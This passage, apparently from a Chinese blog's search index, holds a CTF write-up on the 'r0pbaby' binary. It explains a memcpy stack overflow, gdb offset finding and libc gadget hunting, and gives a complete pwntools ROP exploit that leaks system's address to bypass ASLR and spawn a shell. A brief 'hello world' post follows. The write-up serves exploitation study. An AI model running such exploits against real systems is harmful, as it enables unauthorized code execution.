+<p>（往后做的时候遇到一个问题，看别的大佬的wp，有说要关闭ASLR的，把关不关ASLR分成了两种解法，我自己本地试的时候，发现我关了ASLR也没用，exp根本跑不起来，所以我就按有ASLR的解法来了。）</p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>玩一玩这个程序：</p>
+<p><img src="https://i.loli.net/2019/09/25/Y9TX5HQ6rAqeCWl.png" alt="3.png"></p>
+<p>第一选项打印libc地址</p>
+<p>第二个选项打印system函数地址</p>
+<p>第三个是向栈写数据</p>
+<p>用ida看一下</p>
+<p><img src="https://i.loli.net/2019/09/25/XNL3GmTUg8Exqjf.png" alt="4.png"></p>
+<p><img src="https://i.loli.net/2019/09/25/ipmGdBItCvqrW8P.png" alt="5.png"></p>
+<p>发现危险函数memcpy()，说明存在栈溢出漏洞。</p>
+<p>接下来用gdb调试一下：</p>
+<p><img src="https://i.loli.net/2019/09/25/FbylUpD8Itwn6oM.png" alt="6.png"></p>
+<p><img src="https://i.loli.net/2019/09/25/3dwnQf1E4e8ltgy.png" alt="7.png"></p>
+<p><img src="https://i.loli.net/2019/09/25/Q6DPaOCAoLXgMnt.png" alt="8.png"></p>
+<p>看到程序在0x0000555555554eb3崩溃</p>
+<p><img src="https://i.loli.net/2019/09/25/XKISZ7tq3u1cW2j.png" alt="9.png"></p>
+<p>此时rsp中的值是ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA，来计算一下偏移量:</p>
+<p><img src="https://i.loli.net/2019/09/25/YOpX5HcTKh6tnau.png" alt="10.png"></p>
+<p>所以，ret的地址是以我们输入的偏移量为8的位置来取的。我们这样就可以控制rip了。</p>
+<p>现在来想一下我们该干什么。我们的希望获取一个shell，也就是说要控制程序执行流程，最好能跳转执行system函数。</p>
+<p>所以我们需要构造一个payload让程序执行system(“/bin/sh”)</p>
+<p>接下来我们要做的：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找到&quot;/bin/sh&quot;位置</span><br><span class="line">找到&quot;system函数地址&quot;</span><br><span class="line">寻找合适的gadget，让程序流连接起来</span><br></pre></td></tr></table></figure>
+
+<h3 id="寻找gadget："><a href="#寻找gadget：" class="headerlink" title="寻找gadget："></a><strong>寻找gadget</strong>：</h3><p>我们要跳转执行的地方，要有两个pop和一个call。先来复习一下64位架构下各寄存器的作用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rax 作为函数返回值使用。</span><br><span class="line">%rsp 栈指针寄存器，指向栈顶</span><br><span class="line">%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</span><br><span class="line">%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改</span><br><span class="line">%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</span><br></pre></td></tr></table></figure>
+
+<p>rdi是传第一个参数的，那么我们要寻找的gadget至少有一个pop  rdi，我们可以用ida在libc中来找：</p>
+<p>我们使用的libc是：libc-2.27.so</p>
+<p><img src="https://i.loli.net/2019/09/25/Amvo4REBFTVzp9S.png" alt="11.png"></p>
+<p><img src="https://i.loli.net/2019/09/25/wQFjL2fOEMXCJTl.png" alt="12.png"></p>
+<p>找到了符合的。</p>
+<h3 id="寻找”-bin-sh”"><a href="#寻找”-bin-sh”" class="headerlink" title="寻找”/bin/sh”:"></a><strong>寻找”/bin/sh”:</strong></h3><p>用ida ：</p>
+<p>用ida打开libc-2.27.so，shift + f12 ,ctrl + f 搜索”/bin/sh’</p>
+<p><img src="https://i.loli.net/2019/09/25/VLRNJSbkdmz7u49.png" alt="13.png"></p>
+<p>或：</p>
+<p><img src="https://i.loli.net/2019/09/25/6VRyaCZfKIhJ2wb.png" alt="14.png"></p>
+<p>区别在于ida找到的是程序未加载到内存时的地址，第二种方法找到的是在内存中的地址。如果开启了ASLR，还是用ida吧。</p>
+<h3 id="寻找system："><a href="#寻找system：" class="headerlink" title="寻找system："></a><strong>寻找system：</strong></h3><p>ida打开libc-2.27.so，搜索字符串”system”</p>
+<p><img src="https://i.loli.net/2019/09/25/JIp9NdfwLaWmo1X.png" alt="15.png"></p>
+<h3 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a><strong>构造payload：</strong></h3><p>“A”*8 + p64(ppc) + p64(sys_addr) + p64(binsh_addr) </p>
+<p>关于这个顺序，我的理解是，因为我们找到的gadget的是先pop rax，再pop rdi，也就是说，当程序跳转到这一块时，先要执行pop rax，又因为rax用来传递函数地址，而且后面还要call rax，那接下来跟的就只能是system函数的地址，pop rdi，就把”/bin/sh”用rdi传过去。</p>
+<p>好了，到这里我们粗略的完成了payload的构造，接下来要考虑的具体一点。</p>
+<p>我们默认是开启了ASLR保护的，程序运行后，我们上面找到的地址就发生变化了，那么程序运行我们如何定位我们需要的地址呢？</p>
+<p>我们知道在程序未加载到内存中时，system在libc中的地址，我们也知道ppc和binsh在libc中的地址，那么就通过计算它们相对于libc_system的偏移，加载到内存中后就可以表示成system运行后的地址+偏移了。而system函数运行后的地址可以通过程序第二个选项来获得。</p>
+<h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp:"></a><strong>编写exp:</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./r0pbaby&apos;)</span><br><span class="line">def get_system_addr():</span><br><span class="line">    sh.recvuntil(&apos;: &apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;system&apos;)</span><br><span class="line">    addr = sh.recvline().split(&apos;0x&apos;)[1].split(&apos;\n&apos;)[0]</span><br><span class="line">    return addr</span><br><span class="line">    </span><br><span class="line">def send_paylaod(sys_addr,binsh_off,ppc_off):</span><br><span class="line">    payload = &apos;A&apos; * 8 + p64(sys_addr + ppc_off) + p64(sys_addr) + p64(sys_addr + binsh_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(len(payload)))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sys_addr = int(get_system_addr(),16)</span><br><span class="line">    #print sys_addr</span><br><span class="line">    libc_sys_addr = 0x4F440</span><br><span class="line">    libc_binsh_addr = 0x1B3E9A</span><br><span class="line">    libc_ppc_addr = 0x12188B</span><br><span class="line">    binsh_off = libc_binsh_addr - libc_sys_addr</span><br><span class="line">    ppc_off = libc_ppc_addr - libc_sys_addr</span><br><span class="line">    send_paylaod(sys_addr,binsh_off,ppc_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/25/fQmon54hdUajYV3.png" alt="16.png"></p>
+]]></content>
+      <categories>
+        <category>Linux pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hello world</title>
+    <url>/2019/09/12/hello-world/</url>
+    <content><![CDATA[<p>刚摸索着在github上搭博客，还没整的特别明白。<br>从今天开始，这就是我正式的博客了，希望我能坚持下去！</p>
+<a id="more"></a>
+]]></content>
+  </entry>
+</search>
